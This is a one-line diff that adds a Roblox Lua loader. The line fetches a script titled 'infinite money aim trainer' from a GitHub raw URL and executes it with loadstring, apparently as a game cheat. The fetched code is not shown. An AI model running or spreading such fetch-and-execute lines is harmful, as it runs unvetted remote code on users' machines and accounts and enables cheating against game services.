@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cnzins1/scripts/refs/heads/main/infinite%20money%20aim%20trainer"))()
